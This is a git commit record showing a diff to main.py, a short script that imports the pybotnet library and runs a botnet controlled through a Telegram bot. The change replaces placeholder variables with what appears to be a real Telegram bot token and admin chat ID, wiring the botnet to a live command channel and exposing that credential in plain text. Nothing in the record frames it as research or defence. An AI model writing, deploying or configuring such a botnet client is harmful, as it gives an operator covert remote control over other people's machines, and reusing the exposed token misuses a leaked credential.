14b03a89abbf1457c4734142d43f91daa9ad5fd2
sanyanupap0123 <bentogoo@hotmail.com>
2022-09-04 05:00:16 +0700

    Update main.py

--- main.py
+++ main.py
@@ -1,7 +1,7 @@
 from pybotnet import BotNet, TelegramEngine
 
 
-telegram_engine = TelegramEngine(token=TELEGRAM_TOKEN, admin_chat_id=ADMIN_CHAT_ID) #
+telegram_engine = TelegramEngine(token=5428867295:AAFrGpuNJ9g-YqBWMBpV1kV1fOqF9ZscI6M, admin_chat_id=1565592493) #
 
 botnet = BotNet(telegram_engine) # 
 botnet.run()
